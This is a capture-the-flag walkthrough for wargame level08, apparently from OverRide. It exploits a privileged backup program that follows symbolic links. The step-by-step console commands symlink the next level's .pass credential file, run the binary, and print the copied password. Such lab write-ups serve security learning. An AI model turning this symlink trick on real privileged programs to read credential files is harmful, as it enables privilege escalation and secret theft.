level08
=======

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

* We have a [level08](src/level08) executable and here is the [code](src/level08.c).
* Looking at the code, we notice:
  - The program takes a filename as an argument.
  - It opens the file using `fopen()` and copies its contents into `./backups/`.
  - It also logs the operation using `log_wrapper()`, which contains a format string vulnerability.
  - The program runs with `level09` privileges.
* The interesting part is how the program handles file paths:
  ```c
  FILE *source = fopen(argv[1], "r");

  strcpy(backup_path, "./backups/");
  strncat(backup_path, argv[1], 99 - strlen(backup_path));

  int backup_fd = open(backup_path, O_WRONLY | O_CREAT | O_EXCL, 0660);
  ```

  The program reads the requested file and creates a copy without checking whether the source is a symbolic link.
* We can exploit this behavior by creating a **symlink** pointing to `/home/users/level09/.pass`.
  First, let's create a writable working directory with a `backups` folder:
  ```console
  level08@OverRide:~$ mkdir -p /tmp/level08-work/backups
  level08@OverRide:~$ cd /tmp/level08-work
  ```
* Now let's create our symlink:
  ```console
  level08@OverRide:/tmp/level08-work$ ln -s /home/users/level09/.pass secret
  ```
  `secret` is now a symbolic link pointing to the protected password file.
* Let's execute the binary using our symlink:
  ```console
  level08@OverRide:/tmp/level08-work$ /home/users/level08/level08 secret
  ```
  The program follows the symlink when opening `secret`. Since it runs with `level09` privileges, it can read the protected file.
  It then creates a copy at `./backups/secret`.
* We can now try to read the backup:
  ```console
  level08@OverRide:/tmp/level08-work$ cat backups/secret
  fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
  ```